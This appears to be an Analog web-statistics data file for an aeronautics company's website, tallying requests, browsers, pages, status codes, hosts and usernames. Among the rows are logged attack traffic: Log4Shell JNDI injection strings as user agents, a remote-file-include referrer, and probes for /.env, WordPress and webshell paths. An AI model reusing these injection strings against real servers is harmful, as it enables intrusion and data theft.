x	VE	analog 5.24
x	HN	gtaeronautics.com
x	PS	2024	02	16	02	08
x	FR	2007	12	18	17	05
x	LR	2024	02	15	05	58
x	E7	2024	02	16	02	08
x	SR	1706440
x	S7	8778
x	NC	599604
x	C7	0
x	FL	635307
x	F7	415
x	RR	254
x	R7	0
x	NH	109723
x	H7	381
x	BT	57520368399
x	B7	0
1	Rr	102234	5.991	2024
1	Rr	511208	29.958	2023
1	Rr	82334	4.825	2022
1	Rr	98917	5.797	2021
1	Rr	89380	5.238	2020
1	Rr	80088	4.693	2019
1	Rr	68927	4.039	2018
1	Rr	60168	3.526	2017
1	Rr	73316	4.296	2016
1	Rr	80796	4.735	2015
1	Rr	110773	6.491	2014
1	Rr	65173	3.819	2013
1	Rr	60742	3.560	2012
1	Rr	57015	3.341	2011
1	Rr	22139	1.297	2010
1	Rr	69710	4.085	2009
1	Rr	71820	4.209	2008
1	Rr	1700	0.100	2007
1	*BT	R	511208	2023
b	lRQq	2	6	577065275	17.017	curl/479488
b	lRQq	2	584	1929329282	56.894	curl/7
b	lRQq	2	6	577065272	17.017	curl/8
b	lRQq	1	1223	2885326362	85.085	facebookexternalhit
b	lRQq	2	1223	2885326362	85.085	facebookexternalhit/1
b	lRQq	1	3623	3660525099	107.945	Apache-HttpClient
b	lRQq	2	3622	3083459827	90.928	Apache-HttpClient/4
b	lRQq	2	1	577065272	17.017	Apache-HttpClient/UNAVAILABLE
b	lRQq	1	192	3462391632	102.103	Client
b	lRQq	2	6	577065272	17.017	Client/38550
b	lRQq	2	18	577065272	17.017	Client/35574
b	lRQq	2	12	577065272	17.017	Client/33911
b	lRQq	2	42	577065272	17.017	Client/34739
b	lRQq	2	66	577065272	17.017	Client/36782
b	lRQq	2	48	577065272	17.017	Client/35843
b	lRQq	1	11	4039456904	119.120	WhatsApp
b	lRQq	2	11	4039456904	119.120	WhatsApp/2
b	lRQq	1	27	4039456904	119.120	${${lower:jndi}:${lower:rmi}:
b	lRQq	2	6	1154130544	34.034	${${lower:jndi}:${lower:rmi}://144
b	lRQq	2	4	1154130544	34.034	${${lower:jndi}:${lower:rmi}://51
b	lRQq	2	10	577065272	17.017	${${lower:jndi}:${lower:rmi}://188
b	lRQq	2	3	577065272	17.017	${${lower:jndi}:${lower:rmi}://185
b	lRQq	2	4	577065272	17.017	${${lower:jndi}:${lower:rmi}://167
b	lRQq	1	43	4039456904	119.120	com.google.android.apps.searchlite
b	lRQq	2	2	1154130544	34.034	com.google.android.apps.searchlite/484573
b	lRQq	2	25	577065272	17.017	com.google.android.apps.searchlite/763965
b	lRQq	2	6	577065272	17.017	com.google.android.apps.searchlite/784321
b	lRQq	2	1	577065272	17.017	com.google.android.apps.searchlite/677613
b	lRQq	2	6	577065272	17.017	com.google.android.apps.searchlite/602374
b	lRQq	2	3	577065272	17.017	com.google.android.apps.searchlite/426028
b	lRQq	1	122	4039456904	119.120	MSIE or
b	lRQq	1	309	3594480608	105.998	Dalvik
b	lRQq	2	282	1797240304	52.999	Dalvik/2
b	lRQq	2	27	1797240304	52.999	Dalvik/1
b	lRQq	1	96	3462391632	102.103	WWW-Mechanize
b	lRQq	2	95	2885326360	85.085	WWW-Mechanize/1
b	lRQq	2	1	577065272	17.017	WWW-Mechanize/0
b	lRQq	1	4154	3215548800	94.823	Java
b	lRQq	2	4120	2061418256	60.789	Java/1
b	lRQq	2	34	1154130544	34.034	Java/11
b	lRQq	1	54	3206881240	94.568	Google
b	lRQq	2	50	2052750696	60.534	Google/2
b	lRQq	2	4	1154130544	34.034	Google/1
b	lRQq	1	117	2951370848	87.033	NSPlayer
b	lRQq	2	16	2308261088	68.068	NSPlayer/10
b	lRQq	2	17	2308261088	68.068	NSPlayer/9
b	lRQq	2	5	1154130544	34.034	NSPlayer/12
b	lRQq	2	78	898620152	26.499	NSPlayer/11
b	lRQq	2	1	577065272	17.017	NSPlayer/8
b	lRQq	1	232	2885326360	85.085	DomainCrawler
b	lRQq	2	15	1154130544	34.034	DomainCrawler/1
b	lRQq	2	83	1154130544	34.034	DomainCrawler/2
b	lRQq	2	134	577065272	17.017	DomainCrawler/3
b	lRQq	1	884258	2041883348	60.213	[not listed: 936]
p	*f	0Q	s
p	lR	1	815448	Windows
p	lR	2	353299	Unknown Windows
p	lR	2	196536	Windows NT
p	lR	2	249316	Windows XP
p	lR	2	2233	Windows 95
p	lR	2	408	Windows CE
p	lR	2	2367	Windows 98
p	lR	2	9475	Windows 2000
p	lR	2	384	Windows 3.1
p	lR	2	1430	Windows ME
p	lR	1	347532	OS unknown
p	lR	1	134996	Unix
p	lR	2	131920	Linux
p	lR	2	22	SunOS
p	lR	2	66	BSD
p	lR	2	2985	Other Unix
p	lR	2	3	HP-UX
p	lR	1	171639	Macintosh
p	lR	2	167059	Unknown Macintosh
p	lR	2	3242	Macintosh PowerPC
p	lR	2	1338	Macintosh 68k
p	lR	1	223950	Known robots
p	lR	1	16	WebTV
p	lR	1	13	BeOS
p	lR	1	47	OS/2
p	lR	1	7	Amiga
i	*f	0R	s
i	lRc	1	588347	0.000	/images/
i	lRc	1	871575	0.000	[root directory]
i	lRc	1	156199	0.000	/js/
i	lRc	1	80342	0.000	/css/
i	lRc	1	8235	0.000	/uploads/
i	lRc	1	865	0.000	/videos/
i	lRc	1	541	0.000	/client/
i	lRc	1	1	0.000	/cgi-bin/
i	lRc	1	260	0.000	/dev/
i	lRc	2	24	0.000	/dev/css/
i	lRc	2	46	0.000	/dev/js/
i	lRc	2	81	0.000	/dev/images/
i	lRc	1	1	0.000	/secure/
i	lRc	1	74	0.000	/stats/
r	*f	0.050000%S	s
r	lRSc	1	26614	59	0.000	/links.html
r	lRSc	1	33461	33	0.000	/compnews.html
r	lRSc	1	37242	33	0.000	/aboutus.html
r	lRSc	1	24236	29	0.000	/consultinga.html
r	lRSc	1	23724	29	0.000	/cct&m.html
r	lRSc	1	20633	29	0.000	/pna.html
r	lRSc	1	26178	29	0.000	/contactus.html
r	lRSc	1	11314	26	0.000	/gt380+rpas.html
r	lRSc	1	20280	24	0.000	/indevents.html
r	lRSc	1	22998	24	0.000	/cfmt.html
r	lRSc	1	15112	24	0.000	/sru.html
r	lRSc	1	11106	24	0.000	/gt1500+rpas.html
r	lRSc	1	6680	23	0.000	/gt100hl+rpas.html
r	lRSc	1	28078	23	0.000	/uasfc.html
r	lRSc	1	10628	19	0.000	/gt50t+rpas.html
r	lRSc	1	18113	19	0.000	/faq.html
r	lRSc	1	30225	18	0.000	/indnews.html
r	lRSc	2	141	0	0.000	/indnews.html?referer=www.clickfind.com.au/wp-login.php
r	lRSc	2	1	0	0.000	/indnews.html?referer=top1.co.pl
r	lRSc	2	1	0	0.000	/indnews.html?referer=www.clickfind.com.au//wp-content/themes/busybee/thumb.php?src=http://blogger.com.opontodaarte.com.br/java.php
r	lRSc	1	19760	15	0.000	/employment.html
r	lRSc	1	12854	10	0.000	/rd.html
r	lRSc	1	939	5	0.000	/uploads/big+horn+basin+drone+festival+event+schedule.pdf
r	lRSc	1	1548	4	0.000	/uploads/idrone-pressrelease-powell-version220119.pdf
r	lRSc	1	911	4	0.000	/uploads/droneexpojan2022+(1).pdf
r	lRSc	1	4350	2	0.000	/banditomav.html
r	lRSc	1	774	2	0.000	/uploads/bighornbasindronefestivalflyer-v2-220110.pdf
r	lRSc	1	647	2	0.000	/uploads/2022wydronefestflyer+rev2.pdf
r	lRSc	1	4512	2	0.000	/uavengines.html
r	lRSc	1	3975	1	0.000	/bandituas.html
r	lRSc	1	1	0	0.000	/client/bandito timeline2007.html
r	lRSc	1	2	0	0.000	/client/bandit+timeline2004.html
r	lRSc	1	1	0	0.000	/stats/quick.html
r	lRSc	1	1	0	0.000	/404.htm
r	lRSc	1	12	0	0.000	/client/gta010707002.html
r	lRSc	1	72	0	0.000	/client/bandito+development.html
r	lRSc	1	135	0	0.000	/client/welcome.html
r	lRSc	1	3	0	0.000	/client/gta021305001.html
r	lRSc	1	1	0	0.000	/stats/browserrep.html
r	lRSc	1	741	0	0.000	/gt50t rpas.html
r	lRSc	1	5	0	0.000	/client/gta012405001.html
r	lRSc	1	2	0	0.000	/dev/contactus.html
r	lRSc	1	4	0	0.000	/stats/general.html
r	lRSc	1	1	0	0.000	/stats/dailyrep.html
r	lRSc	1	1	0	0.000	/dev/aboutus.html
r	lRSc	1	18	0	0.000	/client/tacamo+development.html
r	lRSc	1	1	0	0.000	/client/bandit development.html
r	lRSc	1	17	0	0.000	/client/bandit+timeline2008.html
r	lRSc	1	1	0	0.000	/client/bandito+timeline2005.html
r	lRSc	1	23	0	0.000	/client/projectbids.html
r	lRSc	1	1	0	0.000	/stats/host.html
r	lRSc	1	11	0	0.000	/client/rq2+outlaw.html
r	lRSc	1	1	0	0.000	/client/bandit timeline2008.html
r	lRSc	1	20	0	0.000	/client/clientpna.html
r	lRSc	1	15	0	0.000	/client/bandit.html
r	lRSc	1	2	0	0.000	/stats/default.asp
r	lRSc	1	21	0	0.000	/index.htm
r	lRSc	1	1	0	0.000	/cgi-bin/testms.pl
r	lRSc	1	987	0	0.000	/gtamt.html
r	lRSc	1	14	0	0.000	/client/rq1+bandit.html
r	lRSc	1	2253	0	0.000	/gt1500 rpas.html
r	lRSc	1	6	0	0.000	/client/gta021305002.html
r	lRSc	1	4	0	0.000	/client/gta121004001.html
r	lRSc	1	24	0	0.000	/client/tacamo.html
r	lRSc	1	30	0	0.000	/client/mgqgcyat.asp
r	lRSc	1	1	0	0.000	/dev/client.cgi
r	lRSc	1	18702	0	0.000	/default.asp
r	lRSc	1	1666	0	0.000	/gt380 rpas.html
r	lRSc	1	1	0	0.000	/client/bandito+timeline2006.html
r	lRSc	1	16	0	0.000	/client/rq3+bandito.html
r	lRSc	1	1	0	0.000	/dev/uasfc.html
r	lRSc	1	229	0	0.000	/client.cgi
r	lRSc	1	71	0	0.000	/client/bandit+development.html
r	lRSc	1	2	0	0.000	/client/bandito development.html
r	lRSc	1	2	0	0.000	/stats/yearly.html
r	lRSc	1	2	0	0.000	/stats/domain.html
r	lRSc	1	1	0	0.000	/stats/monthly.html
r	lRSc	1	2	0	0.000	/stats/weekly.html
r	lRSc	1	8	0	0.000	/client/gta010707001.html
r	lRSc	1	3749	0	0.000	/bidspridpass.html
r	lRSc	1	6356	0	0.000	/pridpass.html
r	lRSc	1	12	0	0.000	/client/bandito.html
r	lRSc	1	4317	0	0.000	/gtatexan.html
r	lRSc	1	1	0	0.000	/dev/pna.html
r	lRSc	1	1	0	0.000	/client/tacamo development.html
r	lRSc	1	4	0	0.000	/stats/index.htm
r	lRSc	1	4	0	0.000	/stats/nav.html
r	lRSc	1	1	0	0.000	/stats/quarterly.html
r	lRSc	1	2	0	0.000	/stats/directory.html
r	lRSc	1	2	0	0.000	/stats/organisation.html
r	lRSc	1	8	0	0.000	/client/bandito+timeline2007.html
r	lRSc	1	7	0	0.000	/client/bandit+timeline2007.html
r	lRSc	1	1	0	0.000	/dev/pridpass.html
t	*f	0.100000%B	b
t	lRb	1	513977	43.756	.jpg  [JPEG graphics]
t	lRb	1	432683	26.229	.html [Hypertext Markup Language]
t	lRb	1	390652	18.517	[directories]
t	lRb	1	3416	5.242	.mp4
t	lRb	1	778	2.157	.wmv
t	lRb	1	87	2.118	.mpg  [MPEG movie]
t	lRb	1	18734	0.911	.asp  [Active Server REQUESTS]
t	lRb	1	74475	0.296	.gif  [GIF graphics]
t	lRb	1	156245	0.254	.js  [JavaScript code]
t	lRb	1	80358	0.225	.css  [Cascading Style Sheets]
t	lRb	1	4819	0.210	.pdf  [Adobe Portable Document Format]
t	lRb	1	30216	0.084	[not listed: 6]
z	*FR	2023	04	05	20	41
z	*LR	2023	05	09	10	03
z	ScR	0	0.000	84837	0
z	ScR	0	0.000	0	1b-  10b
z	ScR	0	0.000	0	11b- 100b
z	ScR	0	0.000	85122	101b-  1kb
z	ScR	0	0.000	509907	1kb- 10kb
z	ScR	0	0.000	352085	10kb-100kb
z	ScR	0	0.000	104639	100kb-  1Mb
z	ScR	0	0.000	4584	1Mb- 10Mb
z	ScR	0	0.000	55	10Mb-100Mb
z	ScR	0	0.000	13	100Mb-  1Gb
c	*FR	2014	03	02	13	52
c	*LR	2024	02	15	05	58
c	*f	0R	a
c	R	1598998	200 OK
c	R	8632	206 Partial content
c	R	177	301 Document moved permanently
c	R	77	302 Document found elsewhere
c	R	98810	304 Not modified since last retrieval
c	R	1069	400 Bad request
c	R	207	401 Authentication required
c	R	472	403 Access forbidden
c	R	629512	404 Document not found
c	R	2220	405 Method not allowed
c	R	934	406 Document not acceptable to client
c	R	141	416 Requested range not valid
c	R	624	500 Internal server error
c	R	128	501 Request type not supported
I	*FR	2007	12	11	00	52
I	*LR	2024	02	15	05	45
I	*f	-30S	s
I	lRS	1	152747	220	/robots.txt
I	lRS	1	7827	14	/ads.txt
I	lRS	1	3132	12	/.env
I	lRS	1	83	8	/chosen.php
I	lRS	1	413	8	/simple.php
I	lRS	1	1609	6	/sitemap.xml
I	lRS	1	1391	4	/videos/bandito+004+flt+8+clip+092508.wmv
I	lRS	1	4494	4	/xmlrpc.php
I	lRS	1	205	3	/sites/default/files/
I	lRS	1	344	3	/images/gta2+at-6+photo.jpg
I	lRS	1	270	3	/.well-known/
I	lRS	1	225	3	/wp-admin/css/
I	lRS	1	12	3	/wp-content/themes/travelscape/json.php
I	lRS	1	140	3	/wp-content/themes/seotheme/mar.php
I	lRS	1	460	3	/sitemap_index.xml
I	lRS	1	311	3	/sitemap.html
I	lRS	1	206	3	/admin/controller/extension/extension/
I	lRS	1	204	3	/uploads/
I	lRS	1	2410	2	/
I	lRS	1	4	2	/statics/ueditor/php/controller.php
I	lRS	1	429	2	/backup
I	lRS	1	67	2	/wp-content/plugins/backup-backup/includes/backup-heart.php
I	lRS	1	13	2	/wp-content/plugins/backup-backup/includes/hro.php
I	lRS	1	614	2	/new
I	lRS	1	627	2	/old
I	lRS	1	680	2	/wp-admin/admin-ajax.php
I	lRS	1	8575	2	/wp-login.php
I	lRS	1	429	2	/humans.txt
I	lRS	1	202	2	/website-sitemap.xml
I	lRS	1	1428	2	/wordpress/
I	lRS	1	445627	85	[not listed: 27574]
L	*FR	2007	12	11	00	52
L	*LR	2024	02	15	05	45
L	*f	-20S	s
L	RS	3980	21	216.244.66.229
L	RS	17	17	34.171.180.1
L	RS	60	12	167.86.110.100
L	RS	40	10	194.26.192.228
L	RS	63	9	45.141.215.13
L	RS	220	9	66.249.66.197
L	RS	18	9	203.159.90.27
L	RS	1717	9	162.55.85.223
L	RS	261	8	66.249.66.72
L	RS	21	7	119.42.145.82
L	RS	538	6	195.191.219.131
L	RS	30	5	45.80.158.50
L	RS	201	5	52.167.144.57
L	RS	18	5	173.249.13.74
L	RS	16	4	173.249.29.208
L	RS	26	4	178.159.37.38
L	RS	48	4	49.232.28.87
L	RS	24	4	34.73.89.236
L	RS	283	4	66.249.66.74
L	RS	853	4	85.208.98.23
L	RS	626873	259	[not listed: 84975]
K	*FR	2013	12	22	04	20
K	*LR	2024	02	13	13	54
K	*f	-30S	s
K	lRS	1	1878	2	http://gtaeronautics.com/
K	lRS	1	741	2	http://www.gtaeronautics.com/BANDITOMAV.html
K	lRS	1	43	1	http://gtaeronautics.com/config/AspCms_Config.asp
K	lRS	1	7	1	http://gtaeronautics.com/include/taglib/findgs.lib.php
K	lRS	1	6	1	http://www.gtaeronautics.com/template/default/common/common.css
K	lRS	1	2	1	http://gtaeronautics.com/informacione.php
K	lRS	1	12	1	http://gtaeronautics.com/plus/laobiao.php
K	lRS	1	7	1	http://gtaeronautics.com/include/taglib/datas.lib.php
K	lRS	1	65184	0	[not listed: 5939]
E	*FR	2008	01	06	10	12
E	*LR	2024	02	09	03	06
E	*f	-30S	s
E	lSR	1	0	254	[not listed: 7]
l	*FR	2008	01	06	10	12
l	*LR	2024	02	09	03	06
l	*f	-20S	s
l	SR	0	254	[not listed: 116]
v	*f	-20B	b
v	Rb	1049025	65.103	64.41.87.40
v	Rb	657415	34.897	66.113.131.59
R	*FR	2008	01	06	10	12
R	*LR	2024	02	09	03	06
R	*f	-20R	r
R	R	178	66.113.131.59
R	R	76	64.41.87.40
M	*FR	2007	12	11	00	52
M	*LR	2024	02	15	05	45
M	*f	-20R	r
M	R	332701	64.41.87.40
M	R	302606	66.113.131.59
J	*FR	2007	12	11	00	53
J	*LR	2017	03	17	18	30
J	*f	-20R	r
J	R	9	gtaeronautics
J	R	5	lorrigkj
J	R	1	rullma2063
J	R	1	administrator
J	R	1	satish
J	R	1	nnnnn
P	*FR	2023	11	08	09	11
P	*LR	2024	02	15	05	58
P	R	212	0
P	R	90	<= 0.01
P	R	2239	0.01-0.02
P	R	128068	0.02-0.05
P	R	175879	0.05-0.1 
P	R	233693	0.1 -0.2 
P	R	235300	0.2 -0.5 
P	R	118927	0.5 -1   
P	R	65486	1-  2 
P	R	28691	2-  5 
P	R	12369	5- 10 
P	R	6012	10- 20 
P	R	23280	20- 60 
P	R	3495	60-120 
P	R	15234	120-300 
